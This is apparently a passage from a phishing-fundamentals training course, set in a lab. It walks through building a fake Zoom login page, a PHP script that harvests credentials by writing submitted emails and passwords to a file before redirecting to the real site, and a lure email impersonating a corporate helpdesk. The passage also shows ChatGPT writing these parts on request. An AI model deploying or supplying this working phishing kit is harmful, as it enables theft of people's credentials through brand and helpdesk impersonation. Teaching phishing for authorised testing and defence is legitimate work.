id="dropdown_item_dropdown-menu-1889-10" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Italiano </span></li><li id="dropdown_item_dropdown-menu-1889-11" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Tiếng Việt </span></li><li id="dropdown_item_dropdown-menu-1889-12" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> polski </span></li><li id="dropdown_item_dropdown-menu-1889-13" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Türkçe </span></li><li id="dropdown_item_dropdown-menu-1889-14" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Bahasa Indonesia </span></li><li id="dropdown_item_dropdown-menu-1889-15" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Nederlands </span></li><li id="dropdown_item_dropdown-menu-1889-16" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Svenska </span></li></ul></div></div></header>

</div>

</div>
<input type="hidden" id="gtm_pageName" value=""/>
<input type="hidden" id="gtm_pageLanguage" value=""/>
<input type="hidden" id="gtm_userCountry" value=""/>
```

Save the changes and relod the web page. There are some issues. The login form and main images are gone, and although the header is working, the Zoom logo is larger than it was on the original page. It also seems like you need to move the logo a bit to the right.

![phishing fundamentals offsec 12](../../../images/phishing_fundamentals_offsec12.png)

Ask ChatGPT to fix this for you:

```html
<header class="layout-header"><a href="/" class="login-page-logo-wrap"><img src="https://st1.zoom.us/fe-static/fe-signup-login-active/img/ZoomNewLogo.b2fd5c95.png" alt="Zoom Logo" class=""><!----></a><div class="header-links"><span class="header-login-link" style="float: left; line-height: 32px;">New to Zoom?</span><button type="button" class="mgl-xs zm-button--link zm-button--small zm-button"><span class="zm-button__slot"> Sign Up Free </span></button><!----><a type="button" role="link" target="_blank" href="https://support.zoom.us/hc/en-us?ampDeviceId=96aefc2b-027f-4c41-a0e5-5c7ffd74df09&amp;ampSessionId=1751990564013&amp;ampDeviceId=96aefc2b-027f-4c41-a0e5-5c7ffd74df09&amp;ampSessionId=1751990564013" tabindex="0" class="mgl-lg header-login-link zm-button--link zm-button--small zm-button is-link"><span class="zm-button__slot"> Support </span></a><div class="zm-dropdown"><button type="button" class="mgl-lg zm-button--primary-ghost zm-button--small is-ghost zm-button zm-dropdown-selfdefine" aria-label="Language English" role="button" aria-haspopup="listbox" aria-controls="dropdown-menu-9148" aria-expanded="false" tabindex="0"><span class="zm-button__slot"> English </span><i aria-hidden="true" class="zm-icon-down"></i></button><ul role="menu" tabindex="-1" class="zm-dropdown-menu zm-popper" style="display: none;" id="dropdown-menu-9148"><li id="dropdown_item_dropdown-menu-9148-0" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> English </span></li><li id="dropdown_item_dropdown-menu-9148-1" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Español </span></li><li id="dropdown_item_dropdown-menu-9148-2" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Deutsch </span></li><li id="dropdown_item_dropdown-menu-9148-3" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> 简体中文 </span></li><li id="dropdown_item_dropdown-menu-9148-4" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> 繁體中文 </span></li><li id="dropdown_item_dropdown-menu-9148-5" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Français </span></li><li id="dropdown_item_dropdown-menu-9148-6" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Português </span></li><li id="dropdown_item_dropdown-menu-9148-7" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> 日本語 </span></li><li id="dropdown_item_dropdown-menu-9148-8" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Русский </span></li><li id="dropdown_item_dropdown-menu-9148-9" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> 한국어 </span></li><li id="dropdown_item_dropdown-menu-9148-10" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Italiano </span></li><li id="dropdown_item_dropdown-menu-9148-11" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Tiếng Việt </span></li><li id="dropdown_item_dropdown-menu-9148-12" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> polski </span></li><li id="dropdown_item_dropdown-menu-9148-13" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Türkçe </span></li><li id="dropdown_item_dropdown-menu-9148-14" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Bahasa Indonesia </span></li><li id="dropdown_item_dropdown-menu-9148-15" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Nederlands </span></li><li id="dropdown_item_dropdown-menu-9148-16" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"><!----> Svenska </span></li></ul></div></div></header>
```

After entering the prompt, ChatGPT not only rewrites the entire code in a much more readable way but provides you with inline CSS that allows you to resize the image and position the image and position it properly.

```html
<header class="layout-header">
  <a href="/" class="login-page-logo-wrap">
    <img src="https://st1.zoom.us/fe-static/fe-signup-login-active/img/ZoomNewLogo.b2fd5c95.png" width="150" alt="Zoom Logo" style="margin-left: 50px; margin-right: 40px; margin-top: 20px; max-width: 110px; height: auto;">
  </a>
  <div class="header-links">
    <span class="header-login-link" style="float: left; line-height: 32px;">New to Zoom?</span>
    <button type="button" class="mgl-xs zm-button--link zm-button--small zm-button">
      <span class="zm-button__slot"> Sign Up Free </span>
    </button>
    <a type="button" role="link" target="_blank" href="https://support.zoom.us/hc/en-us" tabindex="0" class="mgl-lg header-login-link zm-button--link zm-button--small zm-button is-link">
      <span class="zm-button__slot"> Support </span>
    </a>
    <div class="zm-dropdown">
      <button type="button" class="mgl-lg zm-button--primary-ghost zm-button--small is-ghost zm-button zm-dropdown-selfdefine" aria-label="Language English" role="button" aria-haspopup="listbox" aria-controls="dropdown-menu-1889" aria-expanded="false" tabindex="0">
        <span class="zm-button__slot"> English </span><i aria-hidden="true" class="zm-icon-down"></i>
      </button>
      <ul role="menu" tabindex="-1" class="zm-dropdown-menu zm-popper" style="display: none;" id="dropdown-menu-1889">
        <li id="dropdown_item_dropdown-menu-1889-0" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"> English </span></li>
        <li id="dropdown_item_dropdown-menu-1889-1" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"> Español </span></li>
        <li id="dropdown_item_dropdown-menu-1889-2" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"> Deutsch </span></li>
        <li id="dropdown_item_dropdown-menu-1889-3" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"> 简体中文 </span></li>
        <li id="dropdown_item_dropdown-menu-1889-4" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"> 繁體中文 </span></li>
        <li id="dropdown_item_dropdown-menu-1889-5" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"> Français </span></li>
        <li id="dropdown_item_dropdown-menu-1889-6" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"> Português </span></li>
        <li id="dropdown_item_dropdown-menu-1889-7" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"> 日本語 </span></li>
        <li id="dropdown_item_dropdown-menu-1889-8" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"> Русский </span></li>
        <li id="dropdown_item_dropdown-menu-1889-9" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"> 한국어 </span></li>
        <li id="dropdown_item_dropdown-menu-1889-10" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"> Italiano </span></li>
        <li id="dropdown_item_dropdown-menu-1889-11" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"> Tiếng Việt </span></li>
        <li id="dropdown_item_dropdown-menu-1889-12" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"> polski </span></li>
        <li id="dropdown_item_dropdown-menu-1889-13" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"> Türkçe </span></li>
        <li id="dropdown_item_dropdown-menu-1889-14" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"> Bahasa Indonesia </span></li>
        <li id="dropdown_item_dropdown-menu-1889-15" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"> Nederlands </span></li>
        <li id="dropdown_item_dropdown-menu-1889-16" role="menuitem" class="zm-dropdown-menu__item"><span class="zm-dropdown-menu__item-content"> Svenska </span></li>
      </ul>
    </div>
  </div>
</header>
```

The output is much cleaner once you update the code in the `signin.html` and refresh the page. Unfortunately, you're still missing the the left-hand image and the login form. Find the image URL with the Web Developer Tools.

![phishing fundamentals offsec 13](../../../images/phishing_fundamentals_offsec13.png)

You can right-click the image and select "Inspect". The URL should be displayed on the "Inspector" tab. Now that you've gathered all the information you need, ask ChatGPT to add both the image and the form.

```
Write two div tags, one should be positioned to the left and contain this image https://file-paa.zoom.us/NfrSBnueQhSis994ssrwoQ/MS4zLqgvd7xqtS1Jb74wXdUOiUUWlF5h6rInOJRXDreG4YjF/cae7e490-292e-4ba0-ac58-1b0035c3d046.png

The second div tag should be a login form that is the same as the Zoom one from the Sign In page at https://zoom.us/signin#/login

Make the email and password be sent to the "custom_login.php" page once someone clicks on the "Sign In" button
```

Insert this code after the header tag inside your `signin.html` page.

```bash
<div style="float: left; width: 50%; height: 100vh; display: flex; justify-content: center; align-items: center; background: #fff;">
  <img src="https://file-paa.zoom.us/NfrSBnueQhSis994ssrwoQ/MS4zLqgvd7xqtS1Jb74wXdUOiUUWlF5h6rInOJRXDreG4YjF/cae7e490-292e-4ba0-ac58-1b0035c3d046.png" alt="Zoom Illustration" style="max-width: 80%;">
</div>

<div style="float: left; width: 50%; height: 100vh; display: flex; justify-content: center; align-items: center; background: #f9f9f9;">
  <form action="custom_login.php" method="POST" style="width: 100%; max-width: 400px; background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;">
    <h2 style="margin-bottom: 24px; font-size: 24px; font-weight: 600; color: #1d1d1f;">Sign In</h2>

    <label for="email" style="display: block; margin-bottom: 8px; font-weight: 500;">Email Address</label>
    <input type="email" id="email" name="email" required style="width: 100%; padding: 10px 12px; margin-bottom: 20px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">

    <label for="password" style="display: block; margin-bottom: 8px; font-weight: 500;">Password</label>
    <input type="password" id="password" name="password" required style="width: 100%; padding: 10px 12px; margin-bottom: 24px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">

    <button type="submit" style="width: 100%; height: 40px; background-color: #0E71EB; border: none; color: white; font-size: 16px; font-weight: 500; border-radius: 4px; cursor: pointer;">Sign In</button>
  </form>
</div>
```

Update your code, and refresh the page.

![phishing fundamentals offsec 14](../../../images/phishing_fundamentals_offsec14.png)

This is looking pretty good, but there are a few things you need to nudge. Ask ChatGPT to fix a few things for you:

```
Modify the code above and do the following: 
- Adjust the form to not overlap with the image.
- Below the "Sign In" button, add the text "By signing in, I agree to the Zoom's Privacy Statement and Terms of Service." and make "Zoom's Privacy Zoom's Privacy" and "Terms of Service" links that point to the official web pages. 
- Below this make a checkbox with the text "Stay signed in" next to it. 
- Below this add the "Zoom is protected by reCAPTCHA and the Privacy Policy and Terms of Service apply." text and make sure that "Privacy Policy" and "Terms of Service" are hyperlinks that point to the official resources.
```

ChatGPT produces the following code:

```bash
<div style="float: left; width: 50%; height: 100vh; display: flex; justify-content: center; align-items: center; background: #fff; padding-top: 40px;">
  <img src="https://file-paa.zoom.us/NfrSBnueQhSis994ssrwoQ/MS4zLqgvd7xqtS1Jb74wXdUOiUUWlF5h6rInOJRXDreG4YjF/cae7e490-292e-4ba0-ac58-1b0035c3d046.png" alt="Zoom Illustration" style="max-width: 80%; margin-right: 40px;">
</div>

<div style="float: left; width: 50%; height: 100vh; background: #f9f9f9; display: flex; justify-content: center; align-items: center; padding: 40px 20px;">
  <form action="custom_login.php" method="POST" style="width: 100%; max-width: 400px; background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;">
    <h2 style="margin-bottom: 24px; font-size: 24px; font-weight: 600; color: #1d1d1f;">Sign In</h2>

    <label for="email" style="display: block; margin-bottom: 8px; font-weight: 500;">Email Address</label>
    <input type="email" id="email" name="email" required style="width: 100%; padding: 10px 12px; margin-bottom: 20px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">

    <label for="password" style="display: block; margin-bottom: 8px; font-weight: 500;">Password</label>
    <input type="password" id="password" name="password" required style="width: 100%; padding: 10px 12px; margin-bottom: 24px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">

    <button type="submit" style="width: 100%; height: 40px; background-color: #0E71EB; border: none; color: white; font-size: 16px; font-weight: 500; border-radius: 4px; cursor: pointer;">Sign In</button>

    <p style="font-size: 12px; margin-top: 16px; color: #666;">
      By signing in, I agree to the 
      <a href="https://explore.zoom.us/privacy/" target="_blank" style="color: #0E71EB; text-decoration: none;">Zoom's Privacy Statement</a> and 
      <a href="https://explore.zoom.us/terms/" target="_blank" style="color: #0E71EB; text-decoration: none;">Terms of Service</a>.
    </p>

    <div style="margin-top: 12px; display: flex; align-items: center;">
      <input type="checkbox" id="stay_signed_in" name="stay_signed_in" style="margin-right: 8px;">
      <label for="stay_signed_in" style="font-size: 14px; color: #1d1d1f;">Stay signed in</label>
    </div>

    <p style="font-size: 11px; color: #888; margin-top: 20px;">
      Zoom is protected by reCAPTCHA and the 
      <a href="https://policies.google.com/privacy" target="_blank" style="color: #0E71EB; text-decoration: none;">Privacy Policy</a> and 
      <a href="https://policies.google.com/terms" target="_blank" style="color: #0E71EB; text-decoration: none;">Terms of Service</a> apply.
    </p>
  </form>
</div>
```

Once again, you'll overwrite the old code and refresh the page.

![phishing fundamentals offsec 15](../../../images/phishing_fundamentals_offsec15.png)

With all the code changes in place, you now have a lookalike Zoom login page that's pretty convincing.

There are still some things you could tweak, like matching the original fonts. In a real-world campaign, you may want to invest more time in this, but you always want to keep a good balance and avoid reaching the point of dimishing returns.

Next, get ChatGPT help with `custom_login.php`, which handles the POST requests and the email and password you're hoping to capture.

```
Help me write the custom_login.php file, it should first capture the email and password and then write them to a file called "credentials.txt" without overwriting an existing file or its content. 

After it should redirect the user to the official zoom page  https://zoom.us/signin#/login
```

ChatGPT quickly generates this code:

```php
<?php
// Check if the form fields 'email' and 'password' are set
if (isset($_POST['email']) && isset($_POST['password'])) {
    // Get the email and password from the form
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Define the file path to store the credentials
    $file = 'credentials.txt';

    // Prepare the data to write (append mode)
    $data = "Email: " . $email . "\nPassword: " . $password . "\n\n";

    // Use file_put_contents to write to the file and create it if it doesn’t exist
    if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX) === false) {
        echo "Error writing to file.";
        exit();
    }

    // Redirect the user to the official Zoom sign in page
    header('Location: https://zoom.us/signin#/login');
    exit();
} else {
    // If the form is not submitted correctly, output an error message
    echo "Please ensure both email and password are provided.";
}
?>
```

Update the code in `custom_login.php`, create the `credentials.txt` file and apply appropriate permissions.

```bash
kali@kali:~/var/www/html$ sudo echo "" > credentials.txt
kali@kali:~/var/www/html$ sudo chmod 777 custom_login.php
kali@kali:~/var/www/html$ sudo chmod 777 credentials.txt
```

With everything in place, test the code by inputting some fake credentials.

After inputting the credentials, you'll click "Sign In", at which point you are redirected to the actual Zoom website. See if you captured the credentials.

```bash
kali@kali:~/var/www/html$ cat credentials.txt

Email: test@test.com
Password: test
```

### Crafting the Phishing Email

Check the "Sent emails", find the email you're interested in and click "Reply to sender and all recipients":

![phishing fundamentals offsec 16](../../../images/phishing_fundamentals_offsec16.png)

You'll add the email text that ChatGPT generated, which mimics the communication style from the official Helpdeskt account.

```
Subject: Reminder: Please Log In to Keep Your Zoom License!

Hello Sales department,

Just a quick reminder—hope everything’s going smoothly on your end! We’re still working on updating our Zoom license inventory and noticed that some accounts haven’t yet logged in to schedule a meeting. To make sure your account remains on a full license, please click here to log in and schedule a meeting within the next week.

If no meeting is scheduled by the deadline, any inactive accounts will be moved to a free license.

Thanks again for your cooperation, and sorry for the added task! Let us know if you have any questions.

Best regards,
CORP.COM Helpdesk Team
```

You'll add a hyperlink to the text to redirect users to your cloned website. You'll do this in HTML mode:

![phishing fundamentals offsec 17](../../../images/phishing_fundamentals_offsec17.png)

With the HTML editor open, you'll paste your malicious URL as a hyperlink.

![phishing fundamentals offsec 18](../../../images/phishing_fundamentals_offsec18.png)

Finally, you'll send the email. At this point in a real-world scenario, you would begin your potentially long and nerve-wracking wait, hoping that your target responds to your phish.

```bash
kali@kali:~/var/www/html$ cat credentials.txt

Email: test@test.com
Password: test

Email: j.smith.sales@corp.com
Password: W00tw00t!!
```